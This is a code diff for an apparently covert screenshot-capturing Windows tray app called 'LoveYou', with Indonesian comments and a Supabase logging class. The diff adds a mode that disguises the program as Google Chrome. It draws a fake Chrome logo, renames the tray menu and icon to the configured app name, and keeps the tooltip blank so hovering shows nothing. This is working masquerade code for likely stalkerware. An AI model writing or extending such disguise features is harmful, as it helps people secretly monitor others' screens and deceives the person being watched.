@@ -112,6 +112,7 @@ def load_config() -> dict:
         "show_tray_notifications": False,
         "emergency_hotkey": True,
         "hotkey_combo": "Ctrl+Shift+F12",
+        "tray_icon": "heart.ico",
     }
 
     if os.path.exists(config_path):
@@ -137,12 +138,17 @@ def load_config() -> dict:
 
             if "TRAY" in config:
                 conf["show_tray_notifications"] = config["TRAY"].getboolean("notifications", conf["show_tray_notifications"])
+                conf["tray_icon"] = config["TRAY"].get("icon", conf["tray_icon"]).strip()
 
             if "SECURITY" in config:
                 conf["emergency_hotkey"] = config["SECURITY"].getboolean("emergency_hotkey", conf["emergency_hotkey"])
                 conf["hotkey_combo"] = config["SECURITY"].get("hotkey_combo", conf["hotkey_combo"]).strip()
         except Exception as e:
             print(f"[WARN] Gagal membaca config.ini ({e}), menggunakan default.")
+
+    # Deteksi otomatis ikon Chrome jika nama aplikasi disamarkan sebagai Chrome
+    if "chrome" in conf.get("app_name", "").lower() and conf.get("tray_icon") == "heart.ico":
+        conf["tray_icon"] = "chrome.ico"
 
     return conf
 
@@ -571,16 +577,43 @@ class SupabaseLogger:
 # ==============================================================================
 # TRAY ICON & CONTROLLER (PRODUCER-CONSUMER QUEUE)
 # ==============================================================================
-def get_tray_icon_image() -> Image.Image:
-    """Mengambil icon heart.ico atau membuat icon hati dinamis."""
-    base_dir = get_base_dir()
-    icon_path = os.path.join(base_dir, "resources", "heart.ico")
-    if os.path.exists(icon_path):
-        try:
-            return Image.open(icon_path)
-        except Exception:
-            pass
+def find_icon_path(icon_name: str) -> str | None:
+    """
+    Mencari file icon (.ico) di runtime (onefile _MEIPASS, onedir, atau dev mode).
+    """
+    if not icon_name:
+        return None
 
+    filename = os.path.basename(icon_name)
+    candidates = []
+
+    # 1. PyInstaller onefile temp folder (_MEIPASS)
+    meipass = getattr(sys, "_MEIPASS", None)
+    if meipass:
+        candidates.append(os.path.join(meipass, "resources", filename))
+        candidates.append(os.path.join(meipass, filename))
+
+    base_dir = get_base_dir()
+    # 2. Folder exe / workspace
+    candidates.append(os.path.join(base_dir, "resources", filename))
+    candidates.append(os.path.join(base_dir, "_internal", "resources", filename))
+    candidates.append(os.path.join(base_dir, "backend", "resources", filename))
+    candidates.append(os.path.join(base_dir, "..", "backend", "resources", filename))
+    candidates.append(os.path.join(base_dir, filename))
+
+    # 3. Path absolut jika diberikan
+    if os.path.isabs(icon_name):
+        candidates.insert(0, icon_name)
+
+    for p in candidates:
+        if os.path.exists(p):
+            return p
+
+    return None
+
+
+def create_dynamic_heart_icon() -> Image.Image:
+    """Membuat icon hati dinamis jika file heart.ico tidak ditemukan."""
     img = Image.new("RGBA", (64, 64), (0, 0, 0, 0))
     draw = ImageDraw.Draw(img)
     draw.polygon(
@@ -588,6 +621,58 @@ def get_tray_icon_image() -> Image.Image:
         fill=(244, 63, 94),
     )
     return img
+
+
+def create_dynamic_chrome_icon() -> Image.Image:
+    """Membuat logo Google Chrome dinamis jika file chrome.ico tidak ditemukan."""
+    img = Image.new("RGBA", (64, 64), (0, 0, 0, 0))
+    draw = ImageDraw.Draw(img)
+    # Tiga sektor lingkaran luar (Merah, Kuning, Hijau khas Chrome)
+    draw.pieslice([4, 4, 60, 60], start=210, end=330, fill=(234, 67, 53))   # Merah Google
+    draw.pieslice([4, 4, 60, 60], start=330, end=90, fill=(251, 188, 4))    # Kuning Google
+    draw.pieslice([4, 4, 60, 60], start=90, end=210, fill=(52, 168, 83))    # Hijau Google
+    # Lingkaran pemisah putih di tengah
+    draw.ellipse([18, 18, 46, 46], fill=(255, 255, 255))
+    # Lingkaran inti Biru Google
+    draw.ellipse([22, 22, 42, 42], fill=(66, 133, 244))
+    return img
+
+
+def get_tray_icon_image(icon_name: str = "heart.ico") -> Image.Image:
+    """
+    Mengambil icon untuk System Tray sesuai preferensi konfigurasi (chrome.ico, heart.ico, dll).
+    Mendukung PyInstaller onefile (_MEIPASS), onedir, dan mode dev.
+    Jika file tidak ditemukan, membuat ikon dinamis (Chrome atau Heart) sebagai fallback terjamin.
+    """
+    is_chrome = "chrome" in (icon_name or "").lower()
+
+    # 1. Coba cari path file ikon yang diminta
+    icon_path = find_icon_path(icon_name)
+    if icon_path and os.path.exists(icon_path):
+        try:
+            return Image.open(icon_path)
+        except Exception as e:
+            print(f"[WARN] Gagal membuka file icon '{icon_path}': {e}")
+
+    # 2. Jika mode Chrome tapi file spesifik tidak ditemukan, cari fallback chrome.ico
+    if is_chrome:
+        chrome_fallback = find_icon_path("chrome.ico")
+        if chrome_fallback and os.path.exists(chrome_fallback):
+            try:
+                return Image.open(chrome_fallback)
+            except Exception:
+                pass
+        return create_dynamic_chrome_icon()
+
+    # 3. Fallback icon hati
+    heart_fallback = find_icon_path("heart.ico")
+    if heart_fallback and os.path.exists(heart_fallback):
+        try:
+            return Image.open(heart_fallback)
+        except Exception:
+            pass
+
+    return create_dynamic_heart_icon()
 
 
 class ServiceController:
@@ -838,15 +923,21 @@ class ServiceController:
 
 def setup_tray(controller: ServiceController) -> pystray.Icon:
     """Membangun menu interaktif untuk system tray native Windows."""
-    icon_image = get_tray_icon_image()
+    tray_icon_file = controller.conf.get("tray_icon", "heart.ico")
+    is_chrome = "chrome" in tray_icon_file.lower() or "chrome" in controller.conf.get("app_name", "").lower()
+    icon_image = get_tray_icon_image(tray_icon_file)
 
     def get_pause_label(item):
         return "▶ Lanjutkan Screenshot" if controller.is_paused else "⏸ Jeda Screenshot"
 
+    app_name = controller.conf.get("app_name", "LoveYou")
+    header_label = f"🌐 {app_name}" if is_chrome else "❤️ LoveYou"
+    app_open_label = f"🌐 Buka {app_name}" if is_chrome else "💕 Buka LoveYou App"
+
     menu_items = [
-        pystray.MenuItem("❤️ LoveYou", None, enabled=False),
+        pystray.MenuItem(header_label, None, enabled=False),
         pystray.Menu.SEPARATOR,
-        pystray.MenuItem("💕 Buka LoveYou App", controller.on_open_love_ui, default=True),
+        pystray.MenuItem(app_open_label, controller.on_open_love_ui, default=True),
         pystray.Menu.SEPARATOR,
         pystray.MenuItem("📸 Ambil Screenshot Sekarang", controller.on_capture_now),
         pystray.MenuItem("🖼️ Buka Galeri Hasil SS", controller.on_open_gallery),
@@ -869,7 +960,7 @@ def setup_tray(controller: ServiceController) -> pystray.Icon:
     menu = pystray.Menu(*menu_items)
 
     tray = pystray.Icon(
-        name="LoveYou",
+        name=app_name if is_chrome else "LoveYou",
         icon=icon_image,
         title=" ",  # Dikosongkan agar tidak memunculkan tooltip apapun saat kursor diarahkan ke ikon
         menu=menu,
